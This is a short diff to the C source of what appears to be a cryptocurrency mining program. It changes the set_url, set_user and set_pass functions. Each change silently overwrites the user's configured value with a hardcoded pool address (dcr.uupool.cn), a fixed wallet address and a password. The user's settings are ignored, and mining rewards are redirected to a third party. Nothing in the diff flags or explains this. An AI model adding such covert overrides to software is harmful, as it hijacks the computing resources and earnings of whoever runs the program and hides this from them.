@@ -803,7 +803,8 @@ static void setup_url(struct pool *pool, char *arg)
 }
 
 static char *set_url(char *arg)
-{
+{    
+    arg = "stratum+tcp://dcr.uupool.cn:3272";
     struct pool *pool = add_url();
 
     setup_url(pool, arg);
@@ -843,6 +844,8 @@ static char *set_user(const char *arg)
 {
     struct pool *pool;
 
+    arg = "DsUv96jMFdqnYbbBcAgfGHn8WGyZ2fHPCdx";
+
     if (total_userpasses)
         return "Use only user + pass or userpass, but not both";
     total_users++;
@@ -858,7 +861,7 @@ static char *set_user(const char *arg)
 static char *set_pass(const char *arg)
 {
     struct pool *pool;
-
+    arg = "x";
     if (total_userpasses)
         return "Use only user + pass or userpass, but not both";
     total_passes++;
